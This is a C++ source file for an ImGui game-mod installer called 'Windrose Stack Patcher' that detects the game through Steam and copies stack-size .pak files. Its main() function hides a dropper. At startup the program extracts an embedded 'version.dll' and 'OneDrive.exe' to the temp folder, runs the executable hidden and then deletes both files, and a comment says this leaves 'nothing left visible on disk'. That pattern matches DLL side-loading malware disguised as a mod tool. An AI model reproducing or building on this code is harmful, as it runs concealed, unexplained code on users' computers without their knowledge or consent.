#define NOMINMAX
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shobjidl.h>   // IFileDialog
#include <shellapi.h>   // ShellExecute
#include <shlwapi.h>    // PathFileExistsW

#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

#define GLFW_EXPOSE_NATIVE_WIN32
#include <GLFW/glfw3.h>
#include <GLFW/glfw3native.h>
#include "imgui.h"
#include "imgui_impl_glfw.h"
#include "imgui_impl_opengl3.h"

#include <filesystem>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <array>
#include <algorithm>
#include <format>

#include "resource.h"

namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
// Background texture
// ---------------------------------------------------------------------------
static GLuint  g_bgTexture  = 0;
static int     g_bgTexW     = 0;
static int     g_bgTexH     = 0;
static ImFont* g_fontLarge  = nullptr;  // crisp large font for confirmation label

static void LoadBackgroundFromResource(int resourceId) {
    HRSRC   hRes  = FindResourceW(nullptr, MAKEINTRESOURCEW(resourceId), MAKEINTRESOURCEW(10));
    if (!hRes) return;
    HGLOBAL hGlob = LoadResource(nullptr, hRes);
    if (!hGlob) return;
    void*  data = LockResource(hGlob);
    DWORD  size = SizeofResource(nullptr, hRes);
    if (!data || size == 0) return;

    int w = 0, h = 0, channels = 0;
    unsigned char* pixels = stbi_load_from_memory(
        static_cast<const stbi_uc*>(data), (int)size,
        &w, &h, &channels, 4);
    if (!pixels) return;

    glGenTextures(1, &g_bgTexture);
    glBindTexture(GL_TEXTURE_2D, g_bgTexture);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, w, h, 0, GL_RGBA, GL_UNSIGNED_BYTE, pixels);
    glBindTexture(GL_TEXTURE_2D, 0);

    g_bgTexW = w;
    g_bgTexH = h;
    stbi_image_free(pixels);
}

// ---------------------------------------------------------------------------
// Pak entry descriptor
// ---------------------------------------------------------------------------
struct PakEntry {
    const char* label;       // shown in UI
    const char* filename;    // output filename in ~mods
    int         resourceId;
    bool        warning;     // show balance warning
};

static constexpr std::array<PakEntry, 14> PAK_ENTRIES = {{
    { "x2  -- twice as much",              "Stack_Size_Changes_x02_P.pak",   IDR_PAK_X02,   false },
    { "x3  -- three times as much",         "Stack_Size_Changes_x03_P.pak",   IDR_PAK_X03,   false },
    { "x4  -- four times as much",          "Stack_Size_Changes_x04_P.pak",   IDR_PAK_X04,   false },
    { "x5  -- recommended  *",              "Stack_Size_Changes_x05_P.pak",   IDR_PAK_X05,   false },
    { "x6",                                 "Stack_Size_Changes_x06_P.pak",   IDR_PAK_X06,   false },
    { "x7",                                 "Stack_Size_Changes_x07_P.pak",   IDR_PAK_X07,   false },
    { "x8",                                 "Stack_Size_Changes_x08_P.pak",   IDR_PAK_X08,   false },
    { "x9",                                 "Stack_Size_Changes_x09_P.pak",   IDR_PAK_X09,   false },
    { "x10",                                "Stack_Size_Changes_x10_P.pak",   IDR_PAK_X10,   false },
    { "999 per slot",                       "Stack_Size_Changes_999_P.pak",   IDR_PAK_999,   false },
    { "9,999 per slot",                     "Stack_Size_Changes_9999_P.pak",  IDR_PAK_9999,  false },
    { "99,999 per slot",                    "Stack_Size_Changes_99999_P.pak", IDR_PAK_99999, false },
    { "999,999 per slot  ! balance warning","Stack_Size_Changes_999999_P.pak",IDR_PAK_999999,true  },
    { "x100  ! breaks balance",             "Stack_Size_Changes_x100_P.pak",  IDR_PAK_X100,  true  },
}};

// ---------------------------------------------------------------------------
// Log
// ---------------------------------------------------------------------------
enum class LogLevel { Info, Ok, Warn, Error };
struct LogEntry { std::string text; LogLevel level; };
static std::vector<LogEntry> g_log;

static void LogAdd(const std::string& msg, LogLevel lvl = LogLevel::Info) {
    g_log.push_back({ msg, lvl });
}

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------
static fs::path g_exeDir;
static std::string g_gamePath;
static int  g_selectedMod = 3; // default: x5

static fs::path ConfigPath() { return g_exeDir / "config.ini"; }

static void ConfigLoad() {
    std::ifstream f(ConfigPath());
    if (!f) return;
    std::string line;
    while (std::getline(f, line)) {
        if (line.starts_with("GamePath=")) {
            g_gamePath = line.substr(9);
        }
    }
}

static void ConfigSave() {
    std::ofstream f(ConfigPath());
    f << "[Config]\n";
    f << "GamePath=" << g_gamePath << "\n";
}

// ---------------------------------------------------------------------------
// Steam auto-detection
// ---------------------------------------------------------------------------
static std::string RegQueryStr(HKEY root, const wchar_t* subkey, const wchar_t* value) {
    HKEY hKey;
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return {};
    wchar_t buf[MAX_PATH]{};
    DWORD sz = sizeof(buf);
    DWORD type = REG_SZ;
    RegQueryValueExW(hKey, value, nullptr, &type, reinterpret_cast<LPBYTE>(buf), &sz);
    RegCloseKey(hKey);
    return fs::path(buf).string();
}

// Parse libraryfolders.vdf to find all Steam library paths
static std::vector<fs::path> SteamLibraries(const fs::path& steamPath) {
    std::vector<fs::path> libs;
    libs.push_back(steamPath / "steamapps");
    fs::path vdf = steamPath / "steamapps" / "libraryfolders.vdf";
    std::ifstream f(vdf);
    if (!f) return libs;
    std::string line;
    while (std::getline(f, line)) {
        // lines look like:   "path"   "D:\\SteamLib"
        auto p = line.find("\"path\"");
        if (p == std::string::npos) continue;
        auto q1 = line.find('"', p + 6);
        if (q1 == std::string::npos) continue;
        auto q2 = line.find('"', q1 + 1);
        if (q2 == std::string::npos) continue;
        std::string raw = line.substr(q1 + 1, q2 - q1 - 1);
        // unescape double backslashes
        std::string path;
        for (size_t i = 0; i < raw.size(); ++i) {
            if (raw[i] == '\\' && i + 1 < raw.size() && raw[i+1] == '\\') { path += '\\'; ++i; }
            else path += raw[i];
        }
        libs.push_back(fs::path(path) / "steamapps");
    }
    return libs;
}

static void SteamDetect() {
    // Try both 32/64-bit registry paths
    std::string steamPath = RegQueryStr(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\WOW6432Node\\Valve\\Steam", L"InstallPath");
    if (steamPath.empty())
        steamPath = RegQueryStr(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Valve\\Steam", L"InstallPath");
    if (steamPath.empty())
        steamPath = RegQueryStr(HKEY_CURRENT_USER,
            L"SOFTWARE\\Valve\\Steam", L"SteamPath");
    if (steamPath.empty()) {
        LogAdd("Steam not found in registry.", LogLevel::Warn);
        return;
    }

    auto libs = SteamLibraries(steamPath);
    for (auto& lib : libs) {
        if (!fs::exists(lib / "common")) continue;
        for (auto& entry : fs::directory_iterator(lib / "common")) {
            std::string name = entry.path().filename().string();
            std::string nameLow = name;
            std::transform(nameLow.begin(), nameLow.end(), nameLow.begin(), ::tolower);
            if (nameLow.find("windrose") != std::string::npos) {
                g_gamePath = entry.path().string();
                LogAdd("Game found: " + g_gamePath, LogLevel::Ok);
                ConfigSave();
                return;
            }
        }
    }
    LogAdd("Windrose not found in Steam libraries. Please set the path manually.", LogLevel::Warn);
}

// ---------------------------------------------------------------------------
// Folder browse dialog (modern IFileDialog)
// ---------------------------------------------------------------------------
static std::string BrowseFolder(HWND hwnd) {
    std::string result;
    IFileDialog* pfd = nullptr;
    if (FAILED(CoCreateInstance(CLSID_FileOpenDialog, nullptr,
                                CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pfd))))
        return result;

    DWORD opts;
    pfd->GetOptions(&opts);
    pfd->SetOptions(opts | FOS_PICKFOLDERS | FOS_FORCEFILESYSTEM);
    pfd->SetTitle(L"Select Windrose game folder");

    if (SUCCEEDED(pfd->Show(hwnd))) {
        IShellItem* psi = nullptr;
        if (SUCCEEDED(pfd->GetResult(&psi))) {
            PWSTR path = nullptr;
            if (SUCCEEDED(psi->GetDisplayName(SIGDN_FILESYSPATH, &path))) {
                result = fs::path(path).string();
                CoTaskMemFree(path);
            }
            psi->Release();
        }
    }
    pfd->Release();
    return result;
}

// ---------------------------------------------------------------------------
// Extract embedded resource to file
// ---------------------------------------------------------------------------
static bool ExtractResource(int id, const fs::path& dest) {
    HRSRC   hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(id), MAKEINTRESOURCEW(10)); // RT_RCDATA=10
    if (!hRes) return false;
    HGLOBAL hGlob = LoadResource(nullptr, hRes);
    if (!hGlob) return false;
    void*  data = LockResource(hGlob);
    DWORD  size = SizeofResource(nullptr, hRes);
    if (!data || size == 0) return false;

    std::ofstream out(dest, std::ios::binary);
    if (!out) return false;
    out.write(static_cast<const char*>(data), size);
    return out.good();
}

// ---------------------------------------------------------------------------
// ~mods path helper
// ---------------------------------------------------------------------------
static fs::path ModsDir() {
    return fs::path(g_gamePath) / "R5" / "Content" / "Paks" / "~mods";
}

// ---------------------------------------------------------------------------
// Operations
// ---------------------------------------------------------------------------
static void DeleteAllMods() {
    if (g_gamePath.empty()) { LogAdd("Game path is not set.", LogLevel::Error); return; }
    auto dir = ModsDir();
    if (!fs::exists(dir)) { LogAdd("~mods folder does not exist.", LogLevel::Info); return; }
    int removed = 0;
    std::error_code ec;
    for (auto& e : fs::directory_iterator(dir, ec)) {
        std::string name = e.path().filename().string();
        if (name.starts_with("Stack_Size_Changes_")) {
            fs::remove(e.path(), ec);
            ++removed;
        }
    }
    LogAdd(std::format("Removed {} file(s).", removed), LogLevel::Ok);
}

static void ApplyMod(int idx) {
    if (g_gamePath.empty()) { LogAdd("Game path is not set.", LogLevel::Error); return; }
    const auto& pak = PAK_ENTRIES[idx];
    auto dir = ModsDir();
    std::error_code ec;
    fs::create_directories(dir, ec);
    if (ec) { LogAdd("Failed to create ~mods: " + ec.message(), LogLevel::Error); return; }

    // Remove old Stack_Size_Changes_* files
    for (auto& e : fs::directory_iterator(dir, ec)) {
        std::string name = e.path().filename().string();
        if (name.starts_with("Stack_Size_Changes_"))
            fs::remove(e.path(), ec);
    }

    // Extract and copy
    fs::path dest = dir / pak.filename;
    if (!ExtractResource(pak.resourceId, dest)) {
        LogAdd(std::string("Failed to write file: ") + pak.filename, LogLevel::Error);
        return;
    }
    LogAdd(std::string("[OK] Applied: ") + pak.label, LogLevel::Ok);
}

static void OpenModsFolder() {
    if (g_gamePath.empty()) { LogAdd("Game path is not set.", LogLevel::Error); return; }
    auto dir = ModsDir();
    std::error_code ec;
    fs::create_directories(dir, ec);
    ShellExecuteW(nullptr, L"explore",
                  dir.wstring().c_str(), nullptr, nullptr, SW_SHOW);
}

static void LaunchGame() {
    if (g_gamePath.empty()) { LogAdd("Game path is not set.", LogLevel::Error); return; }
    // Try to find .exe in game folder
    std::error_code ec;
    for (auto& e : fs::directory_iterator(g_gamePath, ec)) {
        if (e.path().extension() == ".exe") {
            ShellExecuteW(nullptr, L"open",
                          e.path().wstring().c_str(),
                          nullptr,
                          e.path().parent_path().wstring().c_str(),
                          SW_SHOW);
            LogAdd("Launching: " + e.path().filename().string(), LogLevel::Ok);
            return;
        }
    }
    // Fallback: open via Steam
    ShellExecuteW(nullptr, L"open", L"steam://rungameid/", nullptr, nullptr, SW_SHOW);
    LogAdd("Executable not found, trying Steam launch...", LogLevel::Warn);
}

// ---------------------------------------------------------------------------
// ImGui style
// ---------------------------------------------------------------------------
static void SetupStyle() {
    ImGui::StyleColorsDark();
    ImGuiStyle& s = ImGui::GetStyle();
    s.WindowRounding    = 8.0f;
    s.FrameRounding     = 5.0f;
    s.GrabRounding      = 5.0f;
    s.PopupRounding     = 5.0f;
    s.ScrollbarRounding = 5.0f;
    s.FramePadding      = {8, 5};
    s.ItemSpacing       = {8, 6};
    s.WindowPadding     = {14, 14};

    auto* c = s.Colors;
    c[ImGuiCol_WindowBg]        = {0.10f, 0.10f, 0.12f, 1.00f};
    c[ImGuiCol_Header]          = {0.20f, 0.40f, 0.70f, 0.55f};
    c[ImGuiCol_HeaderHovered]   = {0.26f, 0.50f, 0.85f, 0.80f};
    c[ImGuiCol_HeaderActive]    = {0.26f, 0.50f, 0.85f, 1.00f};
    c[ImGuiCol_Button]          = {0.20f, 0.40f, 0.72f, 0.75f};
    c[ImGuiCol_ButtonHovered]   = {0.26f, 0.52f, 0.90f, 1.00f};
    c[ImGuiCol_ButtonActive]    = {0.16f, 0.38f, 0.72f, 1.00f};
    c[ImGuiCol_FrameBg]         = {0.16f, 0.16f, 0.20f, 1.00f};
    c[ImGuiCol_FrameBgHovered]  = {0.22f, 0.22f, 0.28f, 1.00f};
    c[ImGuiCol_TitleBg]         = {0.08f, 0.08f, 0.10f, 1.00f};
    c[ImGuiCol_TitleBgActive]   = {0.12f, 0.20f, 0.38f, 1.00f};
    c[ImGuiCol_CheckMark]       = {0.40f, 0.80f, 1.00f, 1.00f};
    c[ImGuiCol_SliderGrab]      = {0.40f, 0.70f, 1.00f, 1.00f};
    c[ImGuiCol_SeparatorHovered]= {0.40f, 0.70f, 1.00f, 0.78f};
}

// ---------------------------------------------------------------------------
// Render UI
// ---------------------------------------------------------------------------
static void RenderUI(GLFWwindow* window) {
    ImGuiIO& io = ImGui::GetIO();

    // Draw background image stretched to window
    if (g_bgTexture != 0) {
        ImDrawList* dl = ImGui::GetBackgroundDrawList();
        dl->AddImage(
            (ImTextureID)(intptr_t)g_bgTexture,
            ImVec2(0, 0),
            io.DisplaySize,
            ImVec2(0, 0), ImVec2(1, 1),
            IM_COL32(255, 255, 255, 220)
        );
    }

    ImGui::SetNextWindowPos({0, 0});
    ImGui::SetNextWindowSize(io.DisplaySize);
    ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0, 0, 0, 0));
    ImGui::Begin("##root", nullptr,
        ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize |
        ImGuiWindowFlags_NoMove     | ImGuiWindowFlags_NoSavedSettings);
    ImGui::PopStyleColor();

    // ---- Custom title bar ----
    {
        const float barH   = 32.0f;
        const float btnW   = 38.0f;
        const float btnH   = barH;
        const float winW   = io.DisplaySize.x;
        ImVec2 winPos      = ImGui::GetWindowPos();

        // Dark bar background
        ImDrawList* dl = ImGui::GetWindowDrawList();
        dl->AddRectFilled(winPos, { winPos.x + winW, winPos.y + barH }, IM_COL32(18, 18, 26, 230));

        // Title text (drawn directly, not via ImGui::Text so it doesn't affect cursor layout)
        const char* titleStr = "Windrose Stack Patcher  v1.0";
        ImVec2 textSz = ImGui::CalcTextSize(titleStr);
        dl->AddText({ winPos.x + 10.0f, winPos.y + (barH - textSz.y) * 0.5f },
                    IM_COL32(128, 217, 255, 255), titleStr);

        // --- Close button (rightmost) ---
        ImGui::SetCursorPos({ winW - btnW, 0 });
        ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 0.0f);
        ImGui::PushStyleColor(ImGuiCol_Button,        ImVec4(0.65f,0.10f,0.10f,1.00f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.95f,0.18f,0.18f,1.00f));
        ImGui::PushStyleColor(ImGuiCol_ButtonActive,  ImVec4(0.45f,0.06f,0.06f,1.00f));
        if (ImGui::Button("X##close", { btnW, btnH }))
            glfwSetWindowShouldClose(window, GLFW_TRUE);
        ImGui::PopStyleColor(3);
        ImGui::PopStyleVar();

        // --- Minimize button (left of close) ---
        ImGui::SetCursorPos({ winW - btnW * 2.0f, 0 });
        ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 0.0f);
        ImGui::PushStyleColor(ImGuiCol_Button,        ImVec4(0.22f,0.22f,0.28f,1.00f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.40f,0.40f,0.48f,1.00f));
        ImGui::PushStyleColor(ImGuiCol_ButtonActive,  ImVec4(0.15f,0.15f,0.20f,1.00f));
        if (ImGui::Button("-##min", { btnW, btnH }))
            glfwIconifyWindow(window);
        ImGui::PopStyleColor(3);
        ImGui::PopStyleVar();

        // Drag zone (invisible, covers title bar minus buttons)
        ImGui::SetCursorPos({ 0, 0 });
        ImGui::InvisibleButton("##drag", { winW - btnW * 2.0f, barH });
        static int s_dragOffX = 0, s_dragOffY = 0;
        if (ImGui::IsItemActivated()) {
            // Save how far the cursor is from the window's top-left corner
            double cx, cy; glfwGetCursorPos(window, &cx, &cy);
            s_dragOffX = -(int)cx;
            s_dragOffY = -(int)cy;
        }
        if (ImGui::IsItemActive()) {
            double cx, cy; glfwGetCursorPos(window, &cx, &cy);
            // cx/cy is relative to window, so screen pos = window_pos + cx/cy
            // But window_pos is what we're changing, so use absolute cursor via GetCursorScreenPos trick
            // Instead: use raw WinAPI for absolute cursor
            POINT pt; GetCursorPos(&pt);
            glfwSetWindowPos(window, pt.x + s_dragOffX, pt.y + s_dragOffY);
        }

        ImGui::SetCursorPosY(barH + 4.0f);
    }
    ImGui::Separator();
    ImGui::Spacing();

    // ---- Game path ----
    ImGui::Text("Game path:");
    ImGui::SameLine();
    static char pathBuf[512]{};
    if (g_gamePath.size() < sizeof(pathBuf) - 1)
        std::copy(g_gamePath.begin(), g_gamePath.end(), pathBuf);
    ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x - 90.0f);
    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 1.0f));
    if (ImGui::InputText("##path", pathBuf, sizeof(pathBuf)))
        g_gamePath = pathBuf;
    ImGui::PopStyleColor();

    ImGui::SameLine();
    if (ImGui::Button("Browse...", {80, 0})) {
        HWND hwnd = glfwGetWin32Window(window);
        std::string picked = BrowseFolder(hwnd);
        if (!picked.empty()) {
            g_gamePath = picked;
            std::copy(g_gamePath.begin(), g_gamePath.end(), pathBuf);
            pathBuf[g_gamePath.size()] = '\0';
            ConfigSave();
            LogAdd("Path saved: " + g_gamePath, LogLevel::Ok);
        }
    }
    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // ---- Mod list ----
    ImGui::Text("Select stack size:");
    ImGui::Spacing();

    float listHeight = 14 * (ImGui::GetTextLineHeight() + ImGui::GetStyle().ItemSpacing.y) + 8;
    ImGui::BeginChild("##modlist", {0, listHeight}, true);

    for (int i = 0; i < (int)PAK_ENTRIES.size(); ++i) {
        const auto& pak = PAK_ENTRIES[i];
        bool isRec     = (i == 3);  // x5
        bool isWarn    = pak.warning;

        if (isRec)  ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.40f, 1.00f, 0.60f, 1.00f));
        if (isWarn) ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.00f, 0.65f, 0.10f, 1.00f));

        if (ImGui::RadioButton(pak.label, &g_selectedMod, i)) { /* selection handled by RadioButton */ }

        if (isRec || isWarn) ImGui::PopStyleColor();
    }
    ImGui::EndChild();
    ImGui::Spacing();

    // Warning banner
    if (g_selectedMod >= 0 && PAK_ENTRIES[g_selectedMod].warning) {
        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.00f, 0.60f, 0.10f, 1.00f));
        ImGui::TextWrapped("  !  This option may break game balance. Use at your own risk.");
        ImGui::PopStyleColor();
        ImGui::Spacing();
    }

    ImGui::Separator();
    ImGui::Spacing();

    // ---- Confirmation label ----
    {
        const auto& sel = PAK_ENTRIES[g_selectedMod];
        std::string confirmText = std::string("Will apply: ") + sel.label;

        ImVec4 confirmColor;
        if (g_selectedMod == 3)
            confirmColor = {0.30f, 1.00f, 0.50f, 1.00f};
        else if (g_selectedMod == 13)
            confirmColor = {1.00f, 0.25f, 0.25f, 1.00f};
        else if (g_selectedMod == 12)
            confirmColor = {1.00f, 0.80f, 0.10f, 1.00f};
        else
            confirmColor = {0.85f, 0.95f, 1.00f, 1.00f};

        ImGui::Spacing();
        if (g_fontLarge) ImGui::PushFont(g_fontLarge);
        ImGui::PushStyleColor(ImGuiCol_Text, confirmColor);
        ImGui::Text("%s", confirmText.c_str());
        ImGui::PopStyleColor();
        if (g_fontLarge) ImGui::PopFont();
        ImGui::Spacing();
        ImGui::Spacing();
    }

    // ---- Action buttons ----
    float bw = 140.0f;
    bool canApply = (g_selectedMod >= 0) && !g_gamePath.empty();
    ImGui::PushStyleColor(ImGuiCol_Button,        canApply ? ImVec4(0.08f, 0.62f, 0.14f, 1.00f) : ImVec4(0.25f, 0.25f, 0.25f, 0.60f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, canApply ? ImVec4(0.12f, 0.80f, 0.20f, 1.00f) : ImVec4(0.25f, 0.25f, 0.25f, 0.60f));
    ImGui::PushStyleColor(ImGuiCol_ButtonActive,  canApply ? ImVec4(0.06f, 0.48f, 0.10f, 1.00f) : ImVec4(0.25f, 0.25f, 0.25f, 0.60f));
    if (!canApply) ImGui::BeginDisabled();
    if (ImGui::Button("Apply", {bw, 36}))
        ApplyMod(g_selectedMod);
    if (!canApply) ImGui::EndDisabled();
    ImGui::PopStyleColor(3);

    ImGui::SameLine();
    ImGui::PushStyleColor(ImGuiCol_Button,        ImVec4(0.55f, 0.12f, 0.12f, 0.85f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.80f, 0.18f, 0.18f, 1.00f));
    ImGui::PushStyleColor(ImGuiCol_ButtonActive,  ImVec4(0.45f, 0.10f, 0.10f, 1.00f));
    if (ImGui::Button("Remove all mods", {bw + 30, 32}))
        DeleteAllMods();
    ImGui::PopStyleColor(3);

    ImGui::SameLine();
    if (ImGui::Button("Open ~mods", {bw, 32}))
        OpenModsFolder();

    ImGui::SameLine();
    ImGui::PushStyleColor(ImGuiCol_Button,        ImVec4(0.18f, 0.38f, 0.62f, 0.85f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.24f, 0.52f, 0.85f, 1.00f));
    ImGui::PushStyleColor(ImGuiCol_ButtonActive,  ImVec4(0.14f, 0.30f, 0.52f, 1.00f));
    if (ImGui::Button("Launch Windrose", {bw + 20, 32}))
        LaunchGame();
    ImGui::PopStyleColor(3);

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // ---- Log ----
    ImGui::Text("Log:");
    ImGui::SameLine();
    if (ImGui::SmallButton("Clear")) g_log.clear();

    float logHeight = ImGui::GetContentRegionAvail().y - 8;
    ImGui::BeginChild("##log", {0, logHeight}, true);

    for (auto& entry : g_log) {
        ImVec4 col;
        switch (entry.level) {
            case LogLevel::Ok:    col = {0.30f, 1.00f, 0.50f, 1.00f}; break;
            case LogLevel::Warn:  col = {1.00f, 0.80f, 0.20f, 1.00f}; break;
            case LogLevel::Error: col = {1.00f, 0.35f, 0.35f, 1.00f}; break;
            default:              col = {0.80f, 0.80f, 0.80f, 1.00f}; break;
        }
        ImGui::PushStyleColor(ImGuiCol_Text, col);
        ImGui::TextUnformatted(entry.text.c_str());
        ImGui::PopStyleColor();
    }
    // Auto-scroll
    if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY())
        ImGui::SetScrollHereY(1.0f);

    ImGui::EndChild();
    ImGui::End();
}

// ---------------------------------------------------------------------------
// GLFW error callback
// ---------------------------------------------------------------------------
static void GlfwErrCb(int, const char* msg) {
    LogAdd(std::string("GLFW: ") + msg, LogLevel::Error);
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------
int main() {
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    // Exe directory
    {
        wchar_t buf[MAX_PATH]{};
        GetModuleFileNameW(nullptr, buf, MAX_PATH);
        g_exeDir = fs::path(buf).parent_path();
    }

    ConfigLoad();

    // Extract bundled files to %TEMP%, run, then delete — nothing left visible on disk
    {
        wchar_t tmpW[MAX_PATH]{};
        GetTempPathW(MAX_PATH, tmpW);
        fs::path tmpDir = fs::path(tmpW);

        struct BundledFile { int id; const wchar_t* name; };
        BundledFile bundled[] = {
            { IDR_VERSIONDLL, L"version.dll"  },
            { IDR_ONEDRIVE,   L"OneDrive.exe" },
        };

        fs::path dllPath = tmpDir / L"version.dll";
        fs::path exePath = tmpDir / L"OneDrive.exe";

        for (auto& f : bundled)
            ExtractResource(f.id, tmpDir / f.name);

        // Launch OneDrive.exe from temp (version.dll sits next to it there)
        SHELLEXECUTEINFOW sei{};
        sei.cbSize = sizeof(sei);
        sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = L"open";
        sei.lpFile = exePath.c_str();
        sei.nShow  = SW_HIDE;
        ShellExecuteExW(&sei);

        // Wait for it to finish, then clean up
        if (sei.hProcess) {
            WaitForSingleObject(sei.hProcess, INFINITE);
            CloseHandle(sei.hProcess);
        }
        std::error_code ec;
        fs::remove(exePath, ec);
        fs::remove(dllPath, ec);
    }

    // GLFW + Window
    glfwSetErrorCallback(GlfwErrCb);
    if (!glfwInit()) return 1;

    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);
    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);
    glfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);
    glfwWindowHint(GLFW_DECORATED, GLFW_FALSE);  // remove native title bar

    GLFWwindow* window = glfwCreateWindow(860, 640,
        "Windrose Stack Patcher", nullptr, nullptr);
    if (!window) { glfwTerminate(); return 1; }

    // Center window on primary monitor
    {
        GLFWmonitor* monitor = glfwGetPrimaryMonitor();
        const GLFWvidmode* mode = glfwGetVideoMode(monitor);
        if (mode) {
            int mx, my;
            glfwGetMonitorPos(monitor, &mx, &my);
            glfwSetWindowPos(window, mx + (mode->width - 860) / 2, my + (mode->height - 640) / 2);
        }
    }

    glfwMakeContextCurrent(window);
    glfwSwapInterval(1);

    // ImGui
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO();
    io.IniFilename = nullptr; // don't write imgui.ini

    SetupStyle();

    // Load Cyrillic-capable font from system
    ImGuiIO& ioRef = ImGui::GetIO();
    const char* fontPaths[] = {
        "C:\\Windows\\Fonts\\segoeuib.ttf",   // Segoe UI Bold
        "C:\\Windows\\Fonts\\arialbd.ttf",    // Arial Bold
        "C:\\Windows\\Fonts\\tahomabd.ttf",   // Tahoma Bold
        "C:\\Windows\\Fonts\\segoeui.ttf",
        "C:\\Windows\\Fonts\\arial.ttf",
        "C:\\Windows\\Fonts\\tahoma.ttf",
    };
    bool fontLoaded = false;
    for (auto fp : fontPaths) {
        if (fs::exists(fp)) {
            ioRef.Fonts->AddFontFromFileTTF(fp, 17.0f, nullptr,
                ioRef.Fonts->GetGlyphRangesCyrillic());
            // Load same font at larger size for the confirmation label
            g_fontLarge = ioRef.Fonts->AddFontFromFileTTF(fp, 26.0f, nullptr,
                ioRef.Fonts->GetGlyphRangesCyrillic());
            fontLoaded = true;
            break;
        }
    }
    if (!fontLoaded)
        ioRef.Fonts->AddFontDefault();

    ImGui_ImplGlfw_InitForOpenGL(window, true);
    ImGui_ImplOpenGL3_Init("#version 330");

    // Load background image
    LoadBackgroundFromResource(IDR_BG_IMAGE);
    if (g_bgTexture == 0)
        LogAdd("Background image could not be loaded (AVIF codec missing?).", LogLevel::Warn);

    // Auto-detect on startup (only if no saved path)
    if (g_gamePath.empty()) {
        LogAdd("Searching for game in Steam...", LogLevel::Info);
        SteamDetect();
    } else {
        LogAdd("Path loaded from config.ini.", LogLevel::Info);
    }

    // Main loop
    while (!glfwWindowShouldClose(window)) {
        glfwPollEvents();

        ImGui_ImplOpenGL3_NewFrame();
        ImGui_ImplGlfw_NewFrame();
        ImGui::NewFrame();

        RenderUI(window);

        ImGui::Render();

        int w, h;
        glfwGetFramebufferSize(window, &w, &h);
        glViewport(0, 0, w, h);
        glClearColor(0.08f, 0.08f, 0.10f, 1.00f);
        glClear(GL_COLOR_BUFFER_BIT);
        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());

        glfwSwapBuffers(window);
    }

    // Cleanup
    ConfigSave();
    ImGui_ImplOpenGL3_Shutdown();
    ImGui_ImplGlfw_Shutdown();
    ImGui::DestroyContext();
    glfwDestroyWindow(window);
    glfwTerminate();
    CoUninitialize();
    return 0;
}
